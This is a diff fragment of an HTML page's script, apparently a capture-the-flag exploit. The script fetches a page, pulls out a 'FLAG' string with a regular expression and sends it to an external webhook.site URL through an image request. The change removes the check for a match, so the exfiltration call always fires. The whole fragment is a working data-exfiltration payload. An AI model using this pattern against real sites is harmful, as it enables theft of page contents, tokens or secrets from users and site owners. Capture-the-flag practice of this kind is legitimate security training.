@@ -11,9 +11,7 @@ function doIt() {
   .then(html => {
     // Extract flag from page
     let match = html.match(/FLAG[^<]+/);
-    if(match) {
-      new Image().src = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d?flag=' + encodeURIComponent(match[0]);
-    }
+    new Image().src = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d?flag=' + encodeURIComponent(match[0]);
   });
 }
 </script></body></html>
